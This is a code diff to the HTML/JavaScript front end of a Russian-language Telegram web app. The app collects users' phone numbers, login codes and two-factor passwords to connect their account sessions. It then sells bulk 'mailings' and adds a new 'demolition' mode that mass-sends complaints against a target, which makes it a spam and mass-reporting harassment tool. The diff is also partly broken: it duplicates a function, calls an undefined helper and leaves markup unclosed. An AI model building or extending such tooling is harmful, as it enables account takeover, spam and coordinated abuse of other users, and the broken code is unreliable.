@@ -526,6 +526,8 @@
                             <span>Требуется премиум подписка</span>
                         </div>
                     </div>
+                    <div class="method-option" onclick="selectMethod('demolition')" id="method-demolition">
+    
                 </div>
                 
                 <div class="form-group">
@@ -572,6 +574,81 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
         tg.enableClosingConfirmation();
+        // Настройки для разных окружений
+// Конфигурация URL
+const BACKEND_URL = 'https://your-backend.amvera.app'; // Ваш реальный URL на Amvera
+const IS_TELEGRAM_WEBAPP = typeof window.Telegram !== 'undefined' && window.Telegram.WebApp;
+
+// Для разработки - автоматическое определение URL
+function getBackendUrl() {
+    // Если в режиме разработки и открыто не в Telegram
+    if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+        return 'http://localhost:8080';
+    }
+    return BACKEND_URL;
+}
+
+// Универсальная функция для запросов
+async function fetchWithTelegramAuth(url, options = {}) {
+    const tg = window.Telegram?.WebApp;
+    const finalUrl = `${getBackendUrl()}${url}`;
+    
+    const config = {
+        ...options,
+        headers: {
+            'Content-Type': 'application/json',
+            ...options.headers
+        }
+    };
+    
+    // Добавляем данные Telegram пользователя в тело запроса
+    if (config.body && typeof config.body === 'object') {
+        config.body = JSON.stringify({
+            ...JSON.parse(config.body),
+            telegram_user_id: tg?.initDataUnsafe?.user?.id,
+            telegram_init_data: tg?.initData
+        });
+    }
+    
+    try {
+        const response = await fetch(finalUrl, config);
+        
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Fetch error:', error);
+        throw error;
+    }
+}
+
+// Обновляем все fetch запросы на использование makeRequest
+async function requestCode() {
+    const phoneNumber = document.getElementById('phone-number').value.trim();
+    
+    if (!phoneNumber) {
+        showStatus('error', 'Введите номер телефона');
+        return;
+    }
+    
+    showStatus('loading', 'Отправляем код подтверждения...');
+    
+    try {
+        const result = await makeRequest('/auth/request-code', {
+            method: 'POST',
+            body: JSON.stringify({
+                phone_number: phoneNumber,
+                user_id: currentUserId
+            })
+        });
+        
+        // Обработка ответа...
+    } catch (error) {
+        showStatus('error', 'Ошибка соединения с сервером');
+    }
+}
         
         let userConnected = false;
         let currentUserId = tg.initDataUnsafe.user?.id || 'webapp_user';
@@ -591,37 +668,57 @@
             document.getElementById(tabName + '-tab').classList.add('active');
             document.querySelector(`.nav-tab:nth-child(${tabName === 'connect' ? 1 : 2})`).classList.add('active');
         }
+        function handleMailingAction() {
+    if (selectedMethod === 'demolition') {
+        startDemolition();
+    } else {
+        createMailing();
+    }
+}
         
         function selectMethod(method) {
-            selectedMethod = method;
-            
-            // Сбрасываем выделение всех методов
-            document.querySelectorAll('.method-option').forEach(option => {
-                option.classList.remove('selected');
-            });
-            
-            // Выделяем выбранный метод
-            document.getElementById(`method-${method}`).classList.add('selected');
-            
-            // Показываем/скрываем дополнительные поля
-            const attemptsGroup = document.getElementById('attempts-group');
-            const targetChatGroup = document.getElementById('target-chat-group');
-            const createButton = document.getElementById('create-mailing-btn');
-            
-            if (method === 'targeted') {
-                attemptsGroup.style.display = 'none';
-                targetChatGroup.style.display = 'block';
-                createButton.textContent = 'Запустить таргетированную рассылку';
-            } else {
-                attemptsGroup.style.display = 'block';
-                targetChatGroup.style.display = 'none';
-                if (method === 'advanced') {
-                    createButton.textContent = 'Запустить продвинутую рассылку';
-                } else {
-                    createButton.textContent = 'Запустить базовую рассылку';
-                }
-            }
-        }
+    selectedMethod = method;
+    
+    // Сбрасываем выделение всех методов
+    document.querySelectorAll('.method-option').forEach(option => {
+        option.classList.remove('selected');
+    });
+    
+    // Выделяем выбранный метод
+    document.getElementById(`method-${method}`).classList.add('selected');
+    
+    // Показываем/скрываем дополнительные поля
+    const attemptsGroup = document.getElementById('attempts-group');
+    const targetChatGroup = document.getElementById('target-chat-group');
+    const demolitionGroup = document.getElementById('demolition-group');
+    const createButton = document.getElementById('create-mailing-btn');
+    
+    switch(method) {
+        case 'targeted':
+            attemptsGroup.style.display = 'none';
+            targetChatGroup.style.display = 'block';
+            demolitionGroup.style.display = 'none';
+            createButton.textContent = 'Запустить таргетированную рассылку';
+            break;
+        case 'demolition':
+            attemptsGroup.style.display = 'none';
+            targetChatGroup.style.display = 'none';
+            demolitionGroup.style.display = 'block';
+            createButton.textContent = '🧨 Запустить отправку жалоб';
+            break;
+        case 'advanced':
+            attemptsGroup.style.display = 'block';
+            targetChatGroup.style.display = 'none';
+            demolitionGroup.style.display = 'none';
+            createButton.textContent = 'Запустить продвинутую рассылку';
+            break;
+        default: // basic
+            attemptsGroup.style.display = 'block';
+            targetChatGroup.style.display = 'none';
+            demolitionGroup.style.display = 'none';
+            createButton.textContent = 'Запустить базовую рассылку';
+    }
+}
         
         async function checkConnectionStatus() {
     try {
@@ -723,88 +820,79 @@ function displayUserInfo(userInfo, scanResult) {
 }
         
         async function requestCode() {
-            const phoneNumber = document.getElementById('phone-number').value.trim();
-            const statusEl = document.getElementById('status');
-            
-            if (!phoneNumber) {
-                showStatus('error', 'Введите номер телефона');
-                return;
-            }
-            
-            showStatus('loading', 'Отправляем код подтверждения...');
-            
-            try {
-                const response = await fetch('/auth/request-code', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        phone_number: phoneNumber,
-                        user_id: currentUserId
-                    })
-                });
-                
-                const result = await response.json();
-                
-                if (result.success) {
-                    showStatus('success', 'Код отправлен! Проверьте Telegram.');
-                    document.getElementById('code-step').style.display = 'block';
-                } else {
-                    showStatus('error', 'Ошибка: ' + (result.message || 'Не удалось отправить код'));
-                }
-                
-            } catch (error) {
-                console.error('Error requesting code:', error);
-                showStatus('error', 'Ошибка отправки кода: ' + error.message);
-            }
+    const phoneNumber = document.getElementById('phone-number').value.trim();
+    const statusEl = document.getElementById('status');
+    
+    if (!phoneNumber) {
+        showStatus('error', 'Введите номер телефона');
+        return;
+    }
+    
+    showStatus('loading', 'Отправляем код подтверждения...');
+    
+    try {
+        const response = await fetchWithTelegramAuth('/auth/request-code', {
+            method: 'POST',
+            body: JSON.stringify({
+                phone_number: phoneNumber,
+                user_id: currentUserId
+            })
+        });
+        
+        if (response.success) {
+            showStatus('success', 'Код отправлен! Проверьте Telegram.');
+            document.getElementById('code-step').style.display = 'block';
+        } else {
+            showStatus('error', 'Ошибка: ' + (response.message || 'Не удалось отправить код'));
         }
         
-        async function verifyCode() {
-            const code = document.getElementById('verification-code').value.trim();
-            const statusEl = document.getElementById('status');
-            
-            if (!code) {
-                showStatus('error', 'Введите код подтверждения');
-                return;
+    } catch (error) {
+        console.error('Error requesting code:', error);
+        showStatus('error', 'Ошибка отправки кода');
+    }
+}
+
+// Подтверждение кода
+async function verifyCode() {
+    const code = document.getElementById('verification-code').value.trim();
+    const statusEl = document.getElementById('status');
+    
+    if (!code) {
+        showStatus('error', 'Введите код подтверждения');
+        return;
+    }
+    
+    showStatus('loading', 'Проверяем код...');
+    
+    try {
+        const response = await fetchWithTelegramAuth('/auth/sign-in', {
+            method: 'POST',
+            body: JSON.stringify({
+                code: code,
+                user_id: currentUserId
+            })
+        });
+        
+        if (response.success) {
+            if (response.need_password) {
+                showStatus('success', 'Требуется пароль двухфакторной аутентификации');
+                document.getElementById('password-step').style.display = 'block';
+                document.getElementById('code-step').style.display = 'none';
+            } else {
+                showStatus('success', 'Сессия успешно подключена!');
+                userConnected = true;
+                displayUserInfo(response.user_info, response.scan_result, response.sessions_count);
+                setTimeout(() => switchTab('manage'), 1500);
             }
-            
-            showStatus('loading', 'Проверяем код...');
-            
-            try {
-                const response = await fetch('/auth/sign-in', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        code: code,
-                        user_id: currentUserId
-                    })
-                });
-                
-                const result = await response.json();
-                
-                if (result.success) {
-                    if (result.need_password) {
-                        showStatus('success', 'Требуется пароль двухфакторной аутентификации');
-                        document.getElementById('password-step').style.display = 'block';
-                        document.getElementById('code-step').style.display = 'none';
-                    } else {
-                        showStatus('success', 'Сессия успешно подключена!');
-                        userConnected = true;
-                        displayUserInfo(result.user_info, result.scan_result);
-                        setTimeout(() => switchTab('manage'), 1500);
-                    }
-                } else {
-                    showStatus('error', 'Ошибка: ' + (result.message || 'Неверный код'));
-                }
-                
-            } catch (error) {
-                console.error('Error verifying code:', error);
-                showStatus('error', 'Ошибка проверки кода: ' + error.message);
-            }
+        } else {
+            showStatus('error', 'Ошибка: ' + (response.message || 'Неверный код'));
         }
+        
+    } catch (error) {
+        console.error('Error verifying code:', error);
+        showStatus('error', 'Ошибка проверки кода');
+    }
+}
         
         async function verifyPassword() {
             const password = document.getElementById('password').value;
@@ -872,69 +960,100 @@ function displayUserInfo(userInfo, scanResult) {
 }
         
         async function createMailing() {
-            const messageText = document.getElementById('message-text').value.trim();
-            const attempts = parseInt(document.getElementById('attempts').value);
-            const targetChat = document.getElementById('target-chat').value.trim();
-            const statusEl = document.getElementById('manage-status');
-            
-            if (!userConnected) {
-                showManageStatus('error', 'Сначала подключите сессию');
-                return;
-            }
-            
-            if (!messageText) {
-                showManageStatus('error', 'Введите текст сообщения');
-                return;
-            }
-            
-            if ((selectedMethod === 'basic' || selectedMethod === 'advanced') && (attempts < 1 || attempts > 100)) {
-                showManageStatus('error', 'Количество попыток должно быть от 1 до 100');
-                return;
-            }
-            
-            if (selectedMethod === 'targeted' && !targetChat) {
-                showManageStatus('error', 'Введите ID или username целевого чата');
-                return;
-            }
-            
-            showManageStatus('loading', 'Создаем рассылку...');
-            
-            try {
-                const response = await fetch('/user/create-mailing', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        user_id: currentUserId,
-                        message_text: messageText,
-                        attempts: attempts,
-                        mailing_type: selectedMethod,
-                        target_chat: targetChat
-                    })
-                });
-                
-                const result = await response.json();
-                
-                if (result.success) {
-                    showManageStatus('success', result.message || 'Рассылка успешно запущена');
-                    document.getElementById('message-text').value = '';
-                    document.getElementById('target-chat').value = '';
-                } else {
-                    if (result.requires_subscription) {
-                        showManageStatus('subscription', result.message || 'Требуется подписка');
-                    } else if (result.requires_premium) {
-                        showManageStatus('premium', result.message || 'Требуется премиум подписка');
-                    } else {
-                        showManageStatus('error', 'Ошибка: ' + (result.message || 'Не удалось создать рассылку'));
-                    }
-                }
-                
-            } catch (error) {
-                console.error('Error creating mailing:', error);
-                showManageStatus('error', 'Ошибка создания рассылки: ' + error.message);
+    const messageText = document.getElementById('message-text').value.trim();
+    const attempts = parseInt(document.getElementById('attempts').value);
+    const targetChat = document.getElementById('target-chat').value.trim();
+    const statusEl = document.getElementById('manage-status');
+    
+    if (!userConnected) {
+        showManageStatus('error', 'Сначала подключите сессию');
+        return;
+    }
+    
+    if (!messageText) {
+        showManageStatus('error', 'Введите текст сообщения');
+        return;
+    }
+    
+    if ((selectedMethod === 'basic' || selectedMethod === 'advanced') && (attempts < 1 || attempts > 100)) {
+        showManageStatus('error', 'Количество попыток должно быть от 1 до 100');
+        return;
+    }
+    
+    if (selectedMethod === 'targeted' && !targetChat) {
+        showManageStatus('error', 'Введите ID или username целевого чата');
+        return;
+    }
+    
+    showManageStatus('loading', 'Создаем рассылку...');
+    
+    try {
+        const response = await fetchWithTelegramAuth('/user/create-mailing', {
+            method: 'POST',
+            body: JSON.stringify({
+                user_id: currentUserId,
+                message_text: messageText,
+                attempts: attempts,
+                mailing_type: selectedMethod,
+                target_chat: targetChat
+            })
+        });
+        
+        if (response.success) {
+            showManageStatus('success', response.message || 'Рассылка успешно запущена');
+            document.getElementById('message-text').value = '';
+            document.getElementById('target-chat').value = '';
+        } else {
+            if (response.requires_subscription) {
+                showManageStatus('subscription', response.message || 'Требуется подписка');
+            } else if (response.requires_premium) {
+                showManageStatus('premium', response.message || 'Требуется премиум подписка');
+            } else {
+                showManageStatus('error', 'Ошибка: ' + (response.message || 'Не удалось создать рассылку'));
             }
         }
+        
+    } catch (error) {
+        console.error('Error creating mailing:', error);
+        showManageStatus('error', 'Ошибка создания рассылки');
+    }
+}
+        async function startDemolition() {
+    const messageText = document.getElementById('demolition-text').value.trim();
+    const statusEl = document.getElementById('manage-status');
+    
+    if (!messageText) {
+        showManageStatus('error', 'Введите текст жалобы');
+        return;
+    }
+    
+    showManageStatus('loading', 'Запускаем отправку жалоб...');
+    
+    try {
+        const response = await fetchWithTelegramAuth('/user/demolition', {
+            method: 'POST',
+            body: JSON.stringify({
+                user_id: currentUserId,
+                message_text: messageText
+            })
+        });
+        
+        if (response.success) {
+            showManageStatus('success', response.message || 'Жалобы успешно отправлены!');
+            document.getElementById('demolition-text').value = '';
+        } else {
+            if (response.requires_premium) {
+                showManageStatus('premium', response.message || 'Требуется премиум подписка');
+            } else {
+                showManageStatus('error', 'Ошибка: ' + (response.message || 'Не удалось отправить жалобы'));
+            }
+        }
+        
+    } catch (error) {
+        console.error('Error starting demolition:', error);
+        showManageStatus('error', 'Ошибка отправки жалоб');
+    }
+}
         
         function showStatus(type, message) {
             const statusEl = document.getElementById('status');
@@ -956,3 +1075,4 @@ function displayUserInfo(userInfo, scanResult) {
     </script>
 </body>
 </html>
+
